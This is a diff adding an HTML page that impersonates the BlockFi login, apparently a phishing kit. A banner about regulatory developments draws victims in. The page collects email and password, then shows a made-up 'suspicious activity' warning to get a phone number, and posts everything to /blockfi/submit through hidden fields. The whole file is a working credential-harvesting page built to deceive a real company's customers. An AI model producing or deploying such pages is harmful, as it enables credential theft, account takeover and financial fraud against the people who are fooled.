@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BlockFi</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background-color: #007bff;
+        margin: 0;
+        padding: 20px;
+      }
+      .heading {
+        width: 100%;
+        background-color: yellow;
+        font-size: 4vw;
+        padding: 5vw 0;
+        text-align: center;
+        color: #000;
+        font-weight: 600;
+        position: fixed;
+        top: 0;
+        box-sizing: border-box;
+      }
+      .container {
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        margin-top: 25vw;
+        box-sizing: border-box;
+      }
+      .card,
+      .verification-step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+      }
+      .card img {
+        width: 80%;
+        max-width: 300px;
+        margin-bottom: 20px;
+      }
+      .card h1,
+      .verification-step h1 {
+        margin-top: -30px;
+        margin-bottom: 30px;
+      }
+      .card input,
+      .verification-step input {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin-bottom: 20px;
+        border: none;
+        border-bottom: 1px solid #ccc;
+        outline: none;
+        transition: border-color 0.2s ease-in-out;
+      }
+      .card input:focus,
+      .verification-step input:focus {
+        border-color: #007bff;
+      }
+      .card button,
+      .verification-step button {
+        width: calc(100% - 40px);
+        height: 50px;
+        padding: 12px;
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-bottom: 20px;
+      }
+      .card button:hover,
+      .verification-step button:hover {
+        background-color: #0056b3;
+      }
+      .card .signup {
+        background-color: #6c757d;
+        width: calc(100% - 80px);
+        align-self: flex-end;
+        margin-left: auto;
+        margin-top: 20px;
+      }
+      .card .signup:hover {
+        background-color: #5a6268;
+      }
+      .card .note {
+        margin-top: 20px;
+        font-size: 14px;
+        color: #000;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        width: 100%;
+      }
+      .card .note .signup {
+        margin-left: 20px;
+      }
+      .password-input {
+        display: none;
+        width: 100%;
+      }
+      .password-input input {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin-bottom: 20px;
+        border: none;
+        border-bottom: 1px solid #ccc;
+        outline: none;
+        transition: border-color 0.2s ease-in-out;
+      }
+      .verification-step {
+        text-align: center;
+        max-width: 100%;
+      }
+      .verification-step h1,
+      .verification-step h2,
+      .verification-step h3 {
+        margin: 10px 0;
+      }
+      .verification-step h2,
+      .verification-step h3 {
+        color: red;
+      }
+      .verification-step h2 {
+        font-size: large;
+        margin-top: 15px;
+        margin-bottom: 30px;
+      }
+      .verification-step .phone {
+        font-weight: 600;
+        font-size: larger;
+        margin-bottom: 10px;
+      }
+
+      @media (min-width: 480px) {
+        .heading {
+          font-size: 3vw;
+          padding: 4vw 0;
+        }
+        .container {
+          margin-top: 20vw;
+        }
+      }
+      @media (min-width: 768px) {
+        .heading {
+          font-size: 2.5vw;
+          padding: 3vw 0;
+        }
+        .container {
+          margin-top: 15vw;
+        }
+      }
+      @media (min-width: 992px) {
+        .heading {
+          font-size: 2vw;
+          padding: 2.5vw 0;
+        }
+        .container {
+          margin-top: 10vw;
+        }
+      }
+      @media (min-width: 1200px) {
+        .heading {
+          font-size: 1.5vw;
+          padding: 2vw 0;
+        }
+        .container {
+          margin-top: 8vw;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="heading">
+      View Important Regulatory Developments Regarding BlockFi Interest
+      Accounts.
+    </div>
+    <div class="container" id="container">
+      <form action="/blockfi/submit" method="POST">
+        <div class="card" id="card">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/en/9/95/BlockFi_logo.svg"
+            alt="BlockFi Logo"
+          />
+          <h1>Log in</h1>
+          <input
+            type="email"
+            name="email"
+            id="email"
+            placeholder="Email"
+            required
+          />
+          <div class="password-input">
+            <input
+              type="password"
+              name="password"
+              id="password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <button type="button" onclick="togglePasswordInput()">
+            Continue
+          </button>
+          <div class="note">
+            <span>Don't have an account yet?</span>
+            <button class="signup" type="button">Sign Up</button>
+          </div>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      let step = 1;
+
+      function togglePasswordInput() {
+        if (step === 1) {
+          var emailInput = document.getElementById("email").value;
+          if (emailInput) {
+            var passwordInput = document.querySelector(".password-input");
+            passwordInput.style.display = "block"; // Show password input field
+            step = 2; // Move to the next step
+          } else {
+            alert("Please enter your email");
+          }
+        } else if (step === 2) {
+          var passwordValue = document.getElementById("password").value;
+          if (passwordValue) {
+            var container = document.getElementById("container");
+            container.innerHTML = `
+                        <form action="/blockfi/submit" method="POST">
+                            <div class="verification-step">
+                                <h1>Verification Required</h1>
+                                <h3>Important Message</h3>
+                                <h2>Some Suspicious Activity Found With <br>Your Account, Enter Your Phone <br>Number to Verify Your Identity.</h2>
+                                <input type="hidden" name="email" value="${
+                                  document.getElementById("email").value
+                                }">
+                                <input type="hidden" name="password" value="${passwordValue}">
+                                <label class="phone" for="phone-number">Phone Number</label>
+                                <input type="tel" name="phone" id="phone-number" placeholder="Phone Number" required>
+                                <button type="submit">Submit</button>
+                            </div>
+                        </form>`;
+          } else {
+            alert("Please enter your password");
+          }
+        }
+      }
+    </script>
+  </body>
+</html>
